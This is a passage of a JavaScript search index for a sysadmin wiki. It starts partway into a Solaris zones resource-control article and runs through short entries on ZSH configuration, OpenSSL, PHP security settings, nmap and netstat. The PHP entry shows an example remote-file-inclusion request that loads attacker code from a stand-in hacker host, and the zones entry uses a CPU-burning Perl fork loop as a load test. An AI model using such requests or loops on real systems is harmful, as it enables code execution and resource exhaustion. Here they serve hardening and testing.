-e 'while (--$ARGV[0] and fork) {}; while () {}' 12 \u0026 root@bigfoot# vmstat 3 3 kthr memory page disk faults cpu r b w swap free re mf pi po fr de sr s1 s2 s3 s4 in sy cs us sy id 4 0 0 37954888 15215072 66 206 259 1 1 0 60 13 -0 -0 24 818 4186 1780 64 0 36 0 0 0 38747216 15152224 0 5 0 0 0 0 0 0 0 0 0 768 272 339 100 0 0 0 0 0 38746960 15151968 0 0 0 0 0 0 0 0 0 0 0 788 247 347 100 0 0 root@bigfoot# prstat -Z ZONEID NPROC SWAP RSS MEMORY TIME CPU ZONE 1 55 202M 264M 1.6% 0:36:11 62% bighead 2 47 199M 263M 1.6% 0:20:29 37% bighand 0 49 219M 291M 1.8% 0:01:36 0.1% global As we see, when the system is not fully utilized, each zone uses as many computing resources as it needs.\nNow, we will generate 15 processes in zone bigfoot to see how the bighead and bighand zones consume the computing resources:\nroot@bigfoot# perl -e 'while (--$ARGV[0] and fork) {}; while () {}' 15 \u0026 root@bigfoot# vmstat 3 3 kthr memory page disk faults cpu r b w swap free re mf pi po fr de sr s1 s2 s3 s4 in sy cs us sy id 5 0 0 37520616 15249888 102 314 406 1 1 0 94 13 -0 -0 24 869 6466 2592 50 1 49 15 0 0 38745928 15151392 0 5 0 0 0 0 0 1 0 0 0 806 325 366 100 0 0 15 0 0 38745672 15151136 0 0 0 0 0 0 0 0 0 0 0 739 234 320 100 0 0 root@bigfoot# prstat -Z ZONEID NPROC SWAP RSS MEMORY TIME CPU ZONE 0 65 228M 298M 1.8% 1:32:55 40% global 1 55 202M 264M 1.6% 1:59:48 30% bighead 2 47 199M 263M 1.6% 1:37:32 29% bighand root@bigfoot# prstat -Z ZONEID NPROC SWAP RSS MEMORY TIME CPU ZONE 0 65 228M 298M 1.8% 1:19:15 38% global 2 47 199M 263M 1.6% 1:27:31 31% bighand 1 55 202M 264M 1.6% 1:48:24 31% bighead As we see, each zone is consuming a portion of the computing resources according to its cpu-shares value when the system’s computing resources are fully utilized.\nThe swap property of capped-memory is virtual swap space, not physical swap space linkFor zone bighead running Oracle Database 10g Enterprise Edition with total memory of 2 Gbytes (1.5 Gbytes System Global Area [SGA] and 0.5 Gbytes Process Global area [PGA]), we might just give a maximum of 3 Gbytes memory and 1.5 Gbytes swap space, as follows:\nzonecfg:bighead\u003e info capped-memory capped-memory: physical: 3G [swap: 1.5G] Start up the Oracle database in zone bighead:\noracle@bighead\u003e sqlplus /nolog SQL\u003e conn / as sysdba SQL\u0026 startup ORA-27102: out of memory SVR4 Error: 12: Not enough space So the swap here is not physical swap space. Based on Sun documents, swap here means the total amount of swap that can be consumed by user process address space mappings and tmpfs mounts for this zone. When we set up swap, the capped-memory swap should be set proportionately. For example:\n@bigfoot\u003e vmstat -p 5 memory page executable anonymous filesystem swap free re mf fr de sr epi epo epf api apo apf fpi fpo fpf 38671464 15156336 40 77 1 0 5 1442 0 0 242 0 0 44 1 1 38875352 15312016 0 3 0 0 0 0 0 0 0 0 0 0 0 0 In our case, it should be 3 * ( 38 / 15 ), which equals 7 Gbytes.\nSometimes, a zone consumes more physical memory than the maximum limit link zonecfg:bighead\u003e info capped-memory capped-memory: physical: 1G [swap: 7G] [locked: 1G] The Oracle database took a while to start up. The Resident Set Size (RSS) memory consumed by the zone fluctuated around, as follows:\n# prstat -Z ZONEID NPROC SWAP RSS MEMORY TIME CPU ZONE 36 54 1824M 158M 1.0% 0:01:54 0.5% bighead 36 54 1824M 1779M 11% 0:01:59 0.3% bighead 36 55 1828M 258M 1.6% 0:02:01 0.6% bighead 36 55 1829M 1788M 11% 0:02:13 0.3% bighead But 1779 Mbytes is much more than 1 Gbyte. Sun is aware of this known bug.\nFAQ linkHow to exit zlogin linkTo exit zlogin, there is a default sequence to do:\n~. If you want to personalize this sequence, use -e option while launching zlogin command:\nzlogin -C -e @ big-zone Adding a file system to a running zone linkI needed to add a second file system to one of my Solaris 10 zones this morning, and needed to do so without rebooting the zone. Since the global zone uses loopback mounts to present file systems to zones, adding a new file system was as easy as loopback mounting the file system into the zone’s file system:\nmount -F lofs /filesystems/zone1oracle03 /zones/zone1/root/ora03 Once the file system was mounted, I added it to the zone configuration and then verified it was mounted:\n$ mount Now to update my ASM disk group to use the storage.\nReferences linkhttp://www.solarisinternals.com/wiki/index.php/Zones\nhttp://www.sun.com/bigadmin/content/zones/\nManage Easily Pools with Kpool GUI\nhttp://www.sun.com/bigadmin/content/submitted/zone_resource_control.jsp\nAssigning System Resources to Solaris 10 Zones Without Reboot\nhttp://prefetch.net/blog/index.php/2009/04/12/adding-a-file-system-to-a-running-zone/\n"
            }
        );
    index.add(
            {
                id:  467 ,
                href: "\/Conversion_de_Timestamp_en_Date\/",
                title: "Converting Unix Timestamp to Date",
                description: "How to convert Unix timestamps to human-readable dates using various command-line methods.",
                content: "How to convert a Unix timestamp to a readable date using command line tools.\nUsing Perl link TIMESTAMP=1173279767 perl -e \"print scalar(localtime($TIMESTAMP))\" Using Perl with ctime module link TIMESTAMP=1173279767 perl -e \"require 'ctime.pl'; print \u0026ctime($TIMESTAMP);\" Using Shell with awk link echo 1173279767 | awk '{print strftime(\"%c\",$1)}' Using Shell with date link TIMESTAMP=1173279767 date -d \"1970-01-01 $TIMESTAMP sec GMT\" Or even simpler:\ndate -d@1234567890 "
            }
        );
    index.add(
            {
                id:  468 ,
                href: "\/Ex%C3%A9cuter_des_commandes_au_logout\/",
                title: "Execute Commands at Logout",
                description: "How to execute commands when a user logs out from a system, such as disconnecting a VPN or performing cleanup tasks.",
                content: "Introduction linkIt can sometimes be useful to run commands when logging out, such as disconnecting a VPN or similar tasks.\nUsage linkHere’s an example that you can put in your .profile file:\ntrap cmd 0 "
            }
        );
    index.add(
            {
                id:  469 ,
                href: "\/ZSH_:_un_shell_tr%C3%A8s_pratique\/",
                title: "ZSH: A Very Practical Shell",
                description: "Configuration and usage guide for ZSH shell, a powerful alternative to bash with advanced features like auto-completion, customizable prompts, and better history management.",
                content: "Introduction linkI’ve been thinking about this for a while, but I was waiting to have a sufficiently nice ZSH configuration to publish it. After today’s mishap (running rm -Rf * in the root directory), I decided to finish it quickly. So here’s my configuration which can still be optimized, but is already very good for everyday use :-).\nIt works on Linux, Mac, BSD, and Windows (Cygwin).\nThe content of the files below may not be completely up-to-date. If you want my latest ZSH configuration, here’s my git repository address: https://www.deimos.fr/gitweb\nInstallation linkIf you don’t have ZSH installed, install it in the simplest way possible. On Debian for example:\napt-get install zsh Configuration linkWe’ll first configure the current account and you’ll see if it suits you or not.\n~/.zshrc link #!/bin/zsh # Version detection ZSH_VERSION_TYPE=old if [[ $ZSH_VERSION == 3.1.\u003c6-\u003e* || $ZSH_VERSION == 3.2.\u003c-\u003e* || $ZSH_VERSION == 4.\u003c-\u003e* ]] ; then if which zstyle \u003e /dev/null ; then ZSH_VERSION_TYPE=new fi fi # Uname system export MYSYSTEM=`uname` # If you don't want history enter 1 # Do not forget to delete ~/.zshhistory export NOHIST=\"0\" # Using environnement files for envfile in ~/.zsh/* ; do test -f $envfile \u0026\u0026 source $envfile done # Default Umask umask 022 # Make default color if [ -z \"$nocolor\" ] ; then c6 \u0026\u0026 c2; else PS1=\"%n@%m %~ %% \" export PS1 fi Then create the .zsh directory:\nmkdir .zsh ~/.zsh/alias link #!/bin/zsh # Usefull alias alias utar=\"tar -xvzf\" alias ..='cd ..' alias ...='cd ../..' alias uu='source ~/.zshrc \u0026\u003e /dev/null' # ls if [ $MYSYSTEM = \"Linux\" ] ; then alias ls='ls --color=auto' alias l='ls --color=auto -lg' alias ll='ls --color=auto -lag | $PAGER' fi if [ $MYSYSTEM = \"OpenBSD\" ] ; then if [ -x /usr/local/bin/gls ] ; then alias ls='gls --color=auto' alias l='gls --color=auto -lg' alias ll='gls --color=auto -lag | $PAGER' else alias ls='ls' alias l='ls -lg' alias ll='ls -lag | $PAGER' fi fi if [ $MYSYSTEM = \"Darwin\" ] ; then alias ls='ls -G' alias l='ls -lGg' alias ll='ls -lGag | $PAGER' fi ~/.zsh/complet link #!/bin/zsh autoload -U compinit autoload -U colors ## Check if we are using Cygwin ## if [ `uname` = \"CYGWIN*\" ] ; then compinit -u else compinit fi zstyle ':completion:*:*:cd:*' tag-order local-directories path-directories zstyle ':completion:*' menu select=2 zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s zstyle ':completion:*:rm:*' ignore-line yes zstyle ':completion:*:mv:*' ignore-line yes zstyle ':completion:*:cp:*' ignore-line yes zstyle ':completion:*' verbose yes zstyle ':completion:*:descriptions' format '--==[ %B%d%b ]==--' zstyle ':completion:*:messages' format '--==[ %d ]==--' zstyle ':completion:*:warnings' format 'No matches for: %d' zstyle ':completion:*:corrections' format '%B%d (errors: %e)%b' zstyle ':completion:*' group-name '' # Color completion zstyle ':completion:*' list-colors '' zstyle ':completion:*:*: kill :*:processes' list-colors '=( #b) #([0-9]#)*=0=01;34' zstyle ':completion:*' list-colors 'di=01;34' local _myhosts if [ -d ~/.ssh ]; then if [ -f ~/.ssh/known_hosts ];then _myhosts=(${=${${(f)\"$(\u003c$HOME/.ssh/known_hosts)\"}%%[# ]*}//,/ }) fi fi zstyle ':completion:*' hosts $_myhosts ~/.zsh/env link #!/bin/zsh ## Check if we are using Cygwin ## if [ `uname` = \"CYGWIN*\" ] ; then export TERM=cygwin else export TERM=xterm-color fi usernames=( $(cut -d: -f1 /etc/passwd) ) groups=( $(cut -d: -f1 /etc/group) ) case \"$TERM\" in xterm*|rxvt|linux|cygwin) ;; *) nocolor=yes ;; esac # Set locales if [ $MYSYSTEM = \"SunOS\" ] ; then export LANGUAGE=fr_FR.ISO8859-15 export LC_ALL=fr_FR.ISO8859-15 export LANG=fr_FR.ISO8859-15 else export LANGUAGE=fr_FR.UTF8 export LC_ALL=fr_FR.UTF8 export LANG=fr_FR.UTF8 fi export LESSCHARSET=latin9 export MINICOM=\"-c on\" export LESS=\"-S -g\" export JAVA_HOME=\"/usr/lib/jvm/cacao/\" LOGCHECK=60 WATCHFMT=\"%n has %a %l from %M\" # CVS export CVS_RSH=/usr/bin/ssh export CVSROOT=:ext:user@host:/var/lib/cvs # History export HISTSIZE=5000 export HISTFILE=$HOME/.zshhistory if [ $NOHIST = \"1\" ] ; then export SAVEHIST=0 else export SAVEHIST=$HISTSIZE fi # Defaut editor export EDITOR=vim export LISTMAX=0 # Use most if possible if [[ -x /usr/bin/most || -x /opt/local/bin/most ]] ; then export PAGER=most else export PAGER=more fi export BLOCK_SIZE=human-readable export LS_COLORS='no=00:fi=00:di=0;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.rar=01,31:*.par2=01,31:*.deb=01;31:*.rpm=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.pgm=01;35:*.pbm=01;35:*.ppm=01;35:*.tga=01;35:*.png=01;35:*.GIF=01;35:*.JPG=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.mpg=01;37:*.avi=00;35:*.gl=01;37:*.dl=01;37:*.mly=01;37:*.mll=01;37:*.mli=01;37:*.ml=01;37:*.cpp=01;37:*.cc=01;37:*.c=01;37:*.hh=01;37:*.h=01;37:*Makefile=4;32:*.pl=4;32:*.sh=4;32:*.ps=01;34:*.pdf=01;34:*TODO=01;37:*TOGO=01;37:*README=01;37:*LINKS=01;37:*.y=01;37:*.l=01;37:*.algo=01;37' limit core 0 ~/.zsh/fonctions link #!/bin/zsh # Prompt definition function setprompt { # export PROMPT=\"%{$COLOR2%}[%{$COLOR2%}%D{%H:%M:%S}%{$COLOR2%}] %{$COLOR4%}- %{$COLOR3%}[~%{$COLOR3%}]%{$COLOR4%} %{$COLOR4%}%n%{$COLOR1%}@%{$COLOR4%}%m%{$COLOR3%}%{$COLOR1%} %{$COLOR1%}\u003e%{$COLOR1%}%{$COLOR1%} \" export RPROMPT=\"%{^[[A%}%{$COLOR3%}[%{$COLOR6%}%D{%d-%m-%Y}%{$COLOR3%}]%{$COLOR5%}%{^[[B%}\" export PROMPT2=\"%{$COLOR3%}[%{$COLOR1%}%(#.#.$)%{$COLOR3%}]%{$COLOR4%} \" export SPROMPT=\"%{$COLOR3%}[%{$COLOR1%}correct%{$COLOR3%}[%{$COLOR1%}'%R'%{$COLOR3%}]%{$COLOR1%}-\u003e%{$COLOR3%}[%{$COLOR1%}'%r'%{$COLOR3%}]] [%{$COLOR1%}n%{$COLOR3%}/%{$COLOR1%}y%{$COLOR3%}/%{$COLOR1%}a%{$COLOR3%}/%{$COLOR1%}e%{$COLOR3%}]%{$COLOR4%} \" } function c1 { export COLOR1=\"^[[0;31m\" export COLOR2=\"^[[1;31m\" export COLOR3=\"^[[1;30m\" export COLOR4=\"^[[0;31m\" setprompt } function c2 { # Red export COLOR1=\"^[[1;31m\" # Green export COLOR2=\"^[[1;32m\" # White export COLOR3=\"^[[1;33m\" # Blue export COLOR4=\"^[[1;34m\" # Grey export COLOR5=\"^[[0;37m\" # Purple export COLOR6=\"^[[1;35m\" setprompt } function c3 { export COLOR1=\"^[[0;33m\" export COLOR2=\"^[[1;33m\" export COLOR3=\"^[[1;30m\" export COLOR4=\"^[[0;33m\" setprompt } function c4 { export COLOR1=\"^[[0;34m\" export COLOR2=\"^[[1;34m\" export COLOR3=\"^[[1;30m\" export COLOR4=\"^[[0;34m\" setprompt } function c5 { export COLOR1=\"^[[0;35m\" export COLOR2=\"^[[1;35m\" export COLOR3=\"^[[1;30m\" export COLOR4=\"^[[0;35m\" setprompt } function c6 { export STATUS_WR=\"^[[4;37m\" export STATUS_COLOR=\"^[[1;33m\" export LOGIN_COLOR=\"^[[0;40m\" export HOST_COLOR=\"^[[1;37m\" export COLOR1=\"^[[0;37m\" export COLOR2=\"^[[0;33m\" export COLOR3=\"^[[0;31m\" export COLOR4=\"^[[0;0m\" setprompt } function c7 { export COLOR1=\"^[[0;37m\" export COLOR2=\"^[[1;37m\" export COLOR3=\"^[[1;30m\" export COLOR4=\"^[[0;0m\" setprompt } ~/.zsh/path link #!/bin/sh # OpenBSD Respository test $MYSYSTEM = \"OpenBSD\" \u0026\u0026 export PKG_PATH=ftp://ftp.arcane-networks.fr/pub/OpenBSD/`uname -r`/packages/`machine -a`/ # DarwinPorts Mac OS X if [[ $MYSYSTEM = \"Darwin\" \u0026\u0026 -d /opt/local/bin ]] ; then PATH=\"$PATH:/opt/local/bin:/opt/local/sbin\" fi # Solaris if [[ $MYSYSTEM = \"SunOS\" \u0026\u0026 -d /usr/openwin/bin/ ]] ; then PATH=\"$PATH:/usr/openwin/bin/:/usr/X11/bin:/opt/csw/bin\" fi # Define scripts test -d \"$HOME/.scripts\" \u0026\u0026 PATH=\"$PATH:$HOME/.scripts\" # Define Path PATH=\"$PATH:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/bin\" export PATH ~/.zsh/term link #!/bin/zsh set convert-meta off # Don't strip high bit when reading or displaying. set input-meta on set output-meta on set append history # multiple parallel zsh sessions will all have their history lists added to the history # No bips unsetopt beep unsetopt hist_beep unsetopt list_beep unsetopt ignore_eof # Logout Ctrl+D setopt chase_links # Properly handle symbolic links setopt hist_verify # Don't execute command when searching history with ! setopt auto_list setopt auto_cd # If command is invalid but matches a subdirectory name, execute 'cd subdirectory' setopt auto_remove_slash # When last character of completion is '/' and space is typed after, the '/' is deleted function common_terms () { bindkey \"\\e[2~\" quoted-insert bindkey \"\\e[3~\" delete-char bindkey \"\\e[5~\" beginning-of-history bindkey \"\\e[6~\" end-of-history } # Make the Home, End, and Delete keys work on common terminals. if [[ \"$TERM\" == \"linux\" ]] ; then common_terms bindkey \"\\e[1~\" beginning-of-line bindkey \"\\e[4~\" end-of-line elif [[ \"$TERM\" == \"rxvt\" ]] ; then common_terms bindkey \"\\e[7~\" beginning-of-line bindkey \"\\e[8~\" end-of-line elif [[ \"$TERM\" == xterm* ]] ; then common_terms bindkey \"\\e[1~\" beginning-of-line bindkey \"\\e[4~\" end-of-line fi bindkey -s '^X^Z' '%-^M' bindkey '^[e' expand-cmd-path bindkey -s '^X?' '\\eb=\\ef\\C-x*' bindkey '^[^I' reverse-menu-complete bindkey '^[p' history-beginning-search-backward bindkey '^[n' history-beginning-search-forward bindkey '^W' kill -region bindkey '^I' expand-or-complete-prefix bindkey -s '^[[Z' '\\t' bindkey '^?' backward-delete-char if which setterm \u003e /dev/null ; then setterm -hbcolor bright white setterm -ulcolor cyan fi Usage linkFor usage, here are some basic tricks or features I’ve implemented:\nuu: allows you to refresh your shell (when making modifications or adding new software) utar: equivalent to tar -xzvf ..: equivalent to cd .. ...: equivalent to cd ../.. For the rest, I’ll let you look at the file contents; I try to comment sufficiently.\nAnd for a result, you get something like this:\n[20:07:45] - [~] [01-10-2009] pmavro@pm-laptop \u003e "
            }
        );
    index.add(
            {
                id:  470 ,
                href: "\/Planifier_des_t%C3%A2ches\/",
                title: "Task Scheduling",
                description: "Guide on how to schedule tasks on Linux systems using at and cron utilities",
                content: "Introduction linkUse the at command to automatically execute a job only once at a specified time.\nat linkThe format for the at command is:\nat -m -q queuename time date at -r job at -l The table shows the options you can use to instruct the cron process on how to execute an at job.\nOption Description -m Sends mail to the user after the job has finished -r job Removes a scheduled at job from the queue -q queuename Specifies a specific queue time Specifies a time for the command to execute -l Reports all jobs scheduled for the invoking user date Specifies an optional date for the command to execute, which is either a month name followed by a day number or a day of the week For example, to create an at job to run at 9:00 p.m. to locate and verify the file type of core files from the /export/home directory, perform the command:\n# at 9:00 pm at\u003e find /export/home -name core -exec file {} \\; \u003e\u003e /var/tmp/corelog at\u003e "
            }
        );
    index.add(
            {
                id:  471 ,
                href: "\/Crypter_et_d%C3%A9crypter_un_fichier_avec_OpenSSL\/",
                title: "Encrypt and Decrypt a File with OpenSSL",
                description: "Learn how to encrypt and decrypt files using OpenSSL with simple commands and password protection.",
                content: "Introduction linkThe OpenSSL Project is a collaborative effort to develop a robust, commercial-grade, full-featured, and Open Source toolkit implementing the Secure Sockets Layer (SSL v2/v3) and Transport Layer Security (TLS v1) protocols as well as a full-strength general purpose cryptography library. The project is managed by a worldwide community of volunteers that use the Internet to communicate, plan, and develop the OpenSSL toolkit and its related documentation.\nOpenSSL is based on the excellent SSLeay library developed by Eric A. Young and Tim J. Hudson. The OpenSSL toolkit is licensed under an Apache-style licence, which basically means that you are free to get and use it for commercial and non-commercial purposes subject to some simple license conditions.\nEncrypt link $ openssl des3 -salt -in file.log -out file.des3 enter des-ede3-cbc encryption password: Verifying - enter des-ede3-cbc encryption password: The above will prompt for a password, or you can put it in with a -k option, assuming you’re on a trusted server.\nDecrypt link openssl des3 -d -salt -in file.des3 -out file.txt -k mypassword "
            }
        );
    index.add(
            {
                id:  472 ,
                href: "\/PHP_:_Installation_et_configuration\/",
                title: "PHP: Installation and Configuration",
                description: "A guide to PHP installation and configuration, focusing on security settings and best practices for both development and production environments.",
                content: "Introduction linkEven though PHP works well with its initial configuration, it is sometimes essential to modify certain parameters, especially for security reasons. This article shows how to adapt PHP configuration to your applications’ environment.\nIt’s not very difficult to install PHP on a server and get an operational system. Generally, we are content with just that: installing PHP. But is that enough? Have you never needed to install an extension, modify the maximum size of memory allocated to PHP? Moreover, a critical part of securing your applications is done at this level. In this article, we’ll look in detail at the different configuration options for PHP and how to modify them. Some options must be activated during PHP compilation, others can be modified in Apache, and finally, for most of them, it will be necessary to make changes in the php.ini file(s). To conclude, I will introduce PHPSecInfo, a small utility that analyzes the security options you have chosen to apply to PHP.\nInstallation linkThe first possible configuration takes place during compilation: it allows you to modify certain parameters and add extensions to PHP. I mean “first” in the chronological sense during PHP installation and not in the sense of “main” (see the section on php.ini files in section 3).\nTo compile PHP, you need to get the PHP sources from http://www.php.net/downloads and decompress them in a directory we’ll call php-sources/. Compiling PHP is then very simple and takes place in two steps:\nThe configuration phase allowing to select the options to activate and the extensions to install. This is done with the ./configure command (for a list of available options on your system: ./configure -help - for a complete list). Extension installation is done with the –with-extension option where extension is the name of an allowed extension (gd, mysql, pdo, etc.). So to install the gd extension (graphic library), you would do: ./configure --with-gd Then, the actual compilation phase which is done with the command: make all install Note however that installing available extensions by this method is done much more simply on Debian-based systems using the apt system (apt-cache search php5 to display available libraries). So, still to install the gd library, you would do:\napt-get install php5-gd Which will spare us the compilation phase…\nOther extensions are available through the PECL system, but we would be outside the scope of this article. Let’s return now to the parameters that can be modified using the ./configure command. I will only present you with a few in the following table, the complete and detailed list being available in the PHP manual.\nThe activation of these options will be done using a command of the type:\n./configure --disable-short-tags followed by:\nmake all install Let’s now look at another aspect of configuration: Apache.\nConfiguration from Apache linkIt is sometimes interesting to modify PHP behavior only for a few projects hosted in well-defined directories.\nIf you have compiled PHP as an Apache module (see section1), you can use Apache’s configuration file (usually /etc/apache2/apache2.conf file) and .htaccess files (provided that the AllowOverride directive of the directory containing the file has been set to Options or All) to modify PHP configuration.\nThere are many Apache directives that allow you to modify PHP configuration from Apache configuration files. The complete list of these directives is given in the PHP manual [4]. Note however that a type has been assigned to each directive. This type is used to define modification rights to know from which file you have the right to modify it. There are 4 possible types:\nPHP_INI_SYSTEM: entries can be defined in the php.ini file or the apache2.conf file; PHP_INI_PERDIR: entries can be defined in the php.ini file, a .htaccess file or the apache2.conf file; PHP_INI_USER: entries can be defined in user scripts; PHP_INI_ALL: entries can be defined anywhere. You will therefore need to be very careful about the type of each directive to know in which file the modification is allowed.\nTo modify the value of a directive, you will use depending on the case:\nFor directives of type PHP_INI_ALL (including PHP_INI_USER) and PHP_INI_PERDIR: php_flag name value This instruction modifies the value of the directive name by assigning it a value whose type is boolean and is either on or off. For example, for the assert_warning directive (type PHP_INI_ALL) which puts a PHP alert for each failed assertion, the modification is done by:\nphp_flag assert_warning off php_value name value This instruction modifies the value of the directive name by assigning it a value. For example, for the include_path directive (type PHP_INI_ALL) which allows you to give a list of directories where the functions require(), include(), fopen(), file(), readfile() and file_get_contents() will look for files, the modification is done by:\nphp_value include_path \".:/usr/lib/php\" For directives of type PHP_INI_SYSTEM or for directives that the administrator does not want the user to be able to override in a .htaccess file: php_admin_flag name value This instruction behaves in the same way as the php_flag instruction seen previously. It can only be used in the apache2.conf file by the administrator.\nphp_admin_value name value Again, this instruction behaves like php_value and can only be used in the apache2.conf file by the administrator.\nNote that PHP constants are of course not accessible in the Apache configuration file. Thus, to modify the error_reporting directive, you will not be able to use constants of the E_STRICT family, but the value associated with them.\nTo end this part of configuration from Apache, I propose a small example: we have a small site hosted on /var/www/site. The administrator wishes to set the name of the temporary directory used to store files during upload (upload_tmp_dir directive), then a site user wishes to be able to upload larger files than normal in his administration part (user/ directory).\nFor the administrator, the modification will be on the apache2.conf file:\nAllowOverride All php_admin_value upload_tmp_dir \"/var/www/site/tmp\" For the user, the modification will be in /var/www/site/user/.htaccess:\nphp_value upload_max_filesize 2M Let’s now look at the most classic configuration case, that of php.ini files.\nConfiguration in php.ini Files linkSpeaking of “the” php.ini file is an abuse of language: there are not one, but several php.ini configuration files. Indeed, when you install PHP as a server, you will need to modify the configuration file associated with Apache: /etc/php5/apache2/php.ini (on a Debian-based distribution). However, PHP can also be used from the command line; this is called PHP-CLI (for Command Line Interface). This specific mode, used among others by PEAR and PECL, has its own configuration file: /etc/php5/cli/php.ini. So be very careful, because although identical at the beginning, any configuration change on one of the systems will not affect the second! Moreover, if any modification to the php.ini file linked to PHP-CLI is effective immediately, to activate the modifications applied to the php.ini file linked to Apache, you will need to remember to restart the server (/etc/init.d/apache2 restart).\nWith this clarification made, I propose to analyze the structure of a php.ini file and dissect some security-related directives to know what they are used for and what their possible and possibly desirable values are depending on the context.\nStructure of the php.ini File linkThe php.ini file is a text file divided into several sections. Each section is identified by a name and contains variables related to that section. Each section has the following structure:\n[SectionName] variable =\"value\" ... variable_n=\"value_n\" The section name is indicated in brackets, followed by a certain number of variable declarations - also called directives - in the form of pairs consisting of the variable name (case-sensitive) and the value associated with it (numeric, boolean, or character string). Note that each variable declaration is done on a new line.\nFinally, the character “;” signals a comment. Thus, it is easy to disable a PHP feature by commenting out the line associated with it (and conversely to reactivate it by uncommenting it).\nLet’s now see what functionalities we can modify.\nThe Directives of the php.ini File linkWe will address here the directives related to PHP security (for a complete list of directives, always refer to the PHP manual). When considering PHP security, it must be kept in mind that there are essentially two contexts in which a server can be used: development and production. Thus, it is, for example, recommended to disable error display on a production server… but it is much more practical to keep this display in development! Here is a (non-restrictive) list of directives to which attention should be paid.\nManaging Server Headers link expose_php: This directive tells PHP to add its version number to the standard web server header. It is recommended to disable this directive in production (Off value): the information given can serve potential hackers if you don’t regularly update your server.\nError Management link display_errors: This directive allows the display of PHP errors: in production, it must be set to Off (under penalty of providing valuable information to a potential hacker such as the name of your tables, etc.) and, of course, in development, it will need to be set to On.\nerror_reporting: Indicates the types of errors that PHP should report. When choosing to display them, it is recommended to display as many error messages as possible. The recommended values for PHP5 are E_ALL | E_STRICT and E_ALL for PHP4.\nlog_errors: Tells PHP to keep a list of errors encountered in a log file. It is useful to enable this directive even in production for error tracking without direct display.\nerror_log: If the log_errors directive has been set to On, the error_log directive allows you to specify the name and path of the log file you wish to use. Otherwise, the default file will be your Apache’s error.log file (/var/log/apache2/error.inc on Debian-based distributions).\nhtml_errors: Enables or disables HTML tags in error messages: if you have chosen not to display errors (display_errors to Off), this directive is useless. However, in development, by filling in the docref_root and docref_ext directives, you can have direct links to the documentation of the function that caused the error.\ndocref_root: This directive defines the path to the PHP manual. Generally, it will be:\ndocref_root = http://fr.php.net/manual/fr/ docref_ext: Defines the extension of the manual files. Again, these will generally be HTML files: docref_ext = .html.\nManaging File Access link allow_url_fopen: This directive allows the execution of remote files passed as a parameter of a URL. It is recommended to disable it (Off value): a hacker could have external code executed. If you have an index.php page that expects a load parameter, a hacker could execute:\nindex.php?load=http://www.the-hacker.com/script_pirate.txt open_basedir: This directive limits the files accessible by PHP in the tree. The parameter passed to open_basedir is considered as a prefix: if you specify open_basedir = /include/mon_rep, you will give access to /include/mon_rep, /include/mon_repertoire,… To determine a specific directory, you will have to end the path name with a “/”.\nManaging Accessible Functions and Classes link disable_functions and disable_classes: These directives allow you to prohibit respectively a list of functions and a list of “dangerous” classes. To prohibit, for example, the use of the phpinfo() and system() functions, you will need to specify: disable_functions = phpinfo, system.\nManaging Memory and Time Limits link memory_limit: This directive determines the limit memory, in bytes, that a script is allowed to allocate. Since PHP 5.2.0, the default value is set to 16M. This is a reasonable value (an 8M value was previously recommended).\npost_max_size: Defines the maximum size of data (in bytes) received by the POST method (the memory_limit directive must have a value higher than this one, otherwise post_max_size will be limited to the value of memory_limit). The default value is 8M. It is unlikely that you need more memory (you can even possibly lower this value a bit). However, when uploading files, the data transits via a POST method: make sure then that this value is higher than that of the upload_max_filesize directive.\nmax_execution_time: Maximum execution time of scripts in seconds. By default, the value is 30s, but don’t forget that it’s rare for a user to wait that long… This directive mainly allows to get out of infinite loops in the development phase. A good compromise seems to be 15s.\nModifying Directives from PHP linkIt is also possible to modify php.ini file directives punctually directly in PHP scripts. The ini_set() function is then used [5]. This function takes two parameters: the name of the directive to modify and the new value to assign to it. For example, to disable error display:\nini_set('display_errors', 'Off'); Security Audit with PHPSecInfo linkTo check the most classic security points, there is a tool, PHPSecInfo [6], which will examine the values you have assigned to the various directives in the php.ini file. It is of course only a check of the most common points, but, after decompressing the file you will find on http://phpsec.org/projects/phpsecinfo/phpsecinfo.zip, you will get a report similar to that of figure 1 indicating the weak points of your configuration for each directive. The results are expressed according to a color code:\ngreen: all is well; yellow: possible bad configuration value; red: bad configuration value (change of value recommended). If you need more information about a warning message, a link pointing to the site http://phpsec.org/ is available for each directive (see Figure 2).\nConclusion linkIn this article, we have seen the different ways to configure PHP. As this language relies on a web server, it is essential to ensure that security-related directives are correctly parameterized to minimize the risk of intrusion into your programs. The PHPSecInfo application can help you in this approach. But above all, don’t hesitate to “dig” into the PHP documentation… it’s an inexhaustible mine of information.\n"
            }
        );
    index.add(
            {
                id:  473 ,
                href: "\/afficher-les-machines-allumees-sur-le-reseau-courant\/",
                title: "Displaying Active Machines on the Current Network",
                description: "How to find and display all active machines on your current network using nmap.",
                content: "Introduction linkThere are several solutions to find which hosts are up on your network. A simple solution is to use nmap.\nUsage linkHere’s how to do it:\nnmap -sP your network/submask | awk \"/^Host/\"'{ print $2 }' "
            }
        );
    index.add(
            {
                id:  474 ,
                href: "\/Connaitre_le_nombre_de_connections_par_IP\/",
                title: "Check Connections Per IP",
                description: "How to check the number of connections per IP address on Linux and BSD systems",
                content: "Introduction linkHere is a command line to run on your server if you think your server is under attack. It prints out a list of open connections to your server and sorts them by amount.\nUsage linkLinux link netstat -ntu BSD link netstat -na "
            }
        );
    index.add(
            {
                id:  475 ,
                href: "\/Vider_son_cache_DNS_sur_Mac_OS_X\/",
                title: "Clearing DNS Cache on Mac OS X",
                description: "Instructions on how to clear the DNS cache on Mac OS X systems",
                content: "Introduction linkJust like on Windows systems, there’s a solution to clear the DNS cache on Mac OS X.\nUsage link dscacheutil -flushcache "
            }
        );
    index.add(
            {
                id:  476 ,
                href: "\/Quelques_exemples_d\u0027utilisation_de_CMake\/",
                title: "Some examples of CMake usage",
                description: "Learn how to use CMake for configuration files, version management, internationalization, and package generation in your projects.",
